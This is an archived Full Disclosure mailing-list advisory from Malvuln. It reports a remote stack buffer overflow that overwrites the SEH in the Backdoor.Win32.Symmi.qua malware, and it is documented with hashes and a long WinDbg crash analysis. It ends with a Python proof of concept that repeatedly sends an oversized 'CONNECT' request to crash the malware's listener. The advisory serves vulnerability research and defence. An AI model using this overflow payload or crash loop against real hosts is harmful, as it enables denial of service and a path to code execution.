---
title: Backdoor.Win32.Symmi.qua / Remote Stack Buffer Overflow (SEH)
url: https://seclists.org/fulldisclosure/2024/Sep/17
source: Full Disclosure
date: 2024-09-07
fetch_date: 2025-10-06T18:31:10.429809
---

# Backdoor.Win32.Symmi.qua / Remote Stack Buffer Overflow (SEH)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](16)
[By Date](date.html#17)
[![Next](/images/right-icon-16x16.png)](18)

[![Previous](/images/left-icon-16x16.png)](16)
[By Thread](index.html#17)
[![Next](/images/right-icon-16x16.png)](18)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Symmi.qua / Remote Stack Buffer Overflow (SEH)

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Tue, 3 Sep 2024 21:16:00 -0400

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/6e81618678ddfee69342486f6b5ee780.txt
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.Symmi.qua
Vulnerability: Remote Stack Buffer Overflow (SEH)
Description: The malware listens on two random high TCP ports, when
connecting (ncat) one port will return a single character like "â™£"
ord(a) "9827" the other ports return no response, target the non
responsive port. Third-party adversaries who can detect and reach the
server can send a specially crafted payload triggering a stack buffer
overflow overwriting the Structured Exception Handler (SEH).
Family: Symmi
Type: PE32
MD5: 6e81618678ddfee69342486f6b5ee780
SHA256: a073f0bf8599352b57540930c36d655ba9e5a5afeb0c2606b07372e62476d3b3
Vuln ID: MVID-2024-0692
Dropped files: ksomnbi.dll
ASLR: False
DEP: False
CFG: False
Safe SEH: False
Disclosure: 09/03/2024

Memory Dump:
(1834.3f0): Stack buffer overflow - code c0000409 (first/second chance
not available)
eax=00000000 ebx=00000000 ecx=fffff74a edx=027ff640 esi=00000000 edi=00000002
eip=76fced3c esp=027ff038 ebp=027ff078 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
ntdll!ZwWaitForMultipleObjects+0xc:
76fced3c c21400          ret     14h

0:007> .ecxr
eax=027ff741 ebx=02517ff0 ecx=fffff74a edx=027ff640 esi=025188a7 edi=02800000
eip=10001f32 esp=027ff6ec ebp=027ff6fc iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
ksomnbi+0x1f32:
10001f32 aa              stos    byte ptr es:[edi]          es:002b:02800000=00

0:007> !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** WARNING: Unable to verify checksum for
Backdoor.Win32.Symmi.qua.6e81618678ddfee69342486f6b5ee780.exe
*** ERROR: Module load completed but symbols could not be loaded for
Backdoor.Win32.Symmi.qua.6e81618678ddfee69342486f6b5ee780.exe

FAULTING_IP:
ksomnbi+1f32
10001f32 aa              stos    byte ptr es:[edi]

EXCEPTION_RECORD:  027ff23c -- (.exr 0x27ff23c)
ExceptionAddress: 10001f32 (ksomnbi+0x00001f32)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000008
NumberParameters: 2
   Parameter[0]: 00000001
   Parameter[1]: 02800000
Attempt to write to address 02800000

PROCESS_NAME:  Backdoor.Win32.Symmi.qua.6e81618678ddfee69342486f6b5ee780.exe

ERROR_CODE: (NTSTATUS) 0xc0000409 - The system detected an overrun of
a stack-based buffer in this application. This overrun could
potentially allow a malicious user to gain control of this
application.

EXCEPTION_CODE: (NTSTATUS) 0xc0000409 - The system detected an overrun
of a stack-based buffer in this application. This overrun could
potentially allow a malicious user to gain control of this
application.

EXCEPTION_PARAMETER1:  00000015

MOD_LIST: <ANALYSIS/>

NTGLOBALFLAG:  0

APPLICATION_VERIFIER_FLAGS:  0

CONTEXT:  027ff28c -- (.cxr 0x27ff28c)
eax=027ff741 ebx=02517ff0 ecx=fffff74a edx=027ff640 esi=025188a7 edi=02800000
eip=10001f32 esp=027ff6ec ebp=027ff6fc iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
ksomnbi+0x1f32:
10001f32 aa              stos    byte ptr es:[edi]          es:002b:02800000=00
Resetting default scope

WRITE_ADDRESS:  02800000

FOLLOWUP_IP:
ksomnbi+1f32
10001f32 aa              stos    byte ptr es:[edi]

FAULTING_THREAD:  000003f0

BUGCHECK_STR:  APPLICATION_FAULT_STACK_BUFFER_OVERRUN_MISSING_GSFRAME_EXPLOITABLE

PRIMARY_PROBLEM_CLASS:  STACK_BUFFER_OVERRUN_EXPLOITABLE

DEFAULT_BUCKET_ID:  STACK_BUFFER_OVERRUN_EXPLOITABLE

LAST_CONTROL_TRANSFER:  from 10002fc3 to 10001f32

STACK_TEXT:
WARNING: Stack unwind information not available. Following frames may be wrong.
027ff6fc 10002fc3 027ff74a 02517ff0 00000001 ksomnbi+0x1f32
027fff80 41414141 41414141 41414141 41414141 ksomnbi+0x2fc3
027fff84 41414141 41414141 41414141 41414141 0x41414141
027fff88 41414141 41414141 41414141 41414141 0x41414141
027fff8c 41414141 41414141 41414141 41414141 0x41414141
027fff90 41414141 41414141 41414141 41414141 0x41414141
027fff94 41414141 41414141 41414141 41414141 0x41414141
027fff98 41414141 41414141 41414141 41414141 0x41414141
027fff9c 41414141 41414141 41414141 41414141 0x41414141
027fffa0 41414141 41414141 41414141 41414141 0x41414141
027fffa4 41414141 41414141 41414141 41414141 0x41414141
027fffa8 41414141 41414141 41414141 41414141 0x41414141
027fffac 41414141 41414141 41414141 41414141 0x41414141
027fffb0 41414141 41414141 41414141 41414141 0x41414141
027fffb4 41414141 41414141 41414141 41414141 0x41414141
027fffb8 41414141 41414141 41414141 41414141 0x41414141
027fffbc 41414141 41414141 41414141 41414141 0x41414141
027fffc0 41414141 41414141 41414141 41414141 0x41414141
027fffc4 41414141 41414141 41414141 41414141 0x41414141
027fffc8 41414141 41414141 41414141 41414141 0x41414141
027fffcc 41414141 41414141 41414141 41414141 0x41414141
027fffd0 41414141 41414141 41414141 41414141 0x41414141
027fffd4 41414141 41414141 41414141 41414141 0x41414141
027fffd8 41414141 41414141 41414141 41414141 0x41414141
027fffdc 41414141 41414141 41414141 41414141 0x41414141
027fffe0 41414141 41414141 41414141 41414141 0x41414141
027fffe4 41414141 41414141 41414141 41414141 0x41414141
027fffe8 41414141 41414141 41414141 41414141 0x41414141
027fffec 41414141 41414141 41414141 41414141 0x41414141
027ffff0 41414141 41414141 41414141 00000000 0x41414141
027ffff4 41414141 41414141 00000000 00000000 0x41414141
027ffff8 41414141 00000000 00000000 00000000 0x41414141
027ffffc 00000000 00000000 00000000 00000000 0x41414141

SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  ksomnbi+1f32

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: ksomnbi

IMAGE_NAME:  ksomnbi.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  537a7d0a

STACK_COMMAND:  .cxr 0x27ff28c ; kb

FAILURE_BUCKET_ID:
STACK_BUFFER_OVERRUN_EXPLOITABLE_c0000409_ksomnbi.dll!Unknown

BUCKET_ID:  APPLICATION_FAULT_STACK_BUFFER_OVERRUN_MISSING_GSFRAME_EXPLOITABLE_MISSING_GSFRAME_ksomnbi+1f32

Followup: MachineOwner
---------

0:007> !exchain
027ff0f0: ntdll!_except_handler4+0 (76fd6a50)
  CRT scope  0, func:   ntdll!RtlReportExceptionHelper+251 (770157ad)
027ff710: ksomnbi+30df (100030df)
027fffcc: 41414141
Invalid exception stack at 41414141

Exploit/PoC:
from socket import *

def doit():

    MALWARE_HOST="x.x.x.x"
    PORT=6917   #random port

    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    PAYLOAD="CONNECT /"+"A"*2878 + " HTTP/1.1\r\nContent-Type:
application/x-www-form-urlencoded\r\nContent-Length: 2878\r\nHost:
"+MALWARE_HOST
    s.send(PAYLOAD.encode())
    s.close()

while 1:
    doit()
    ...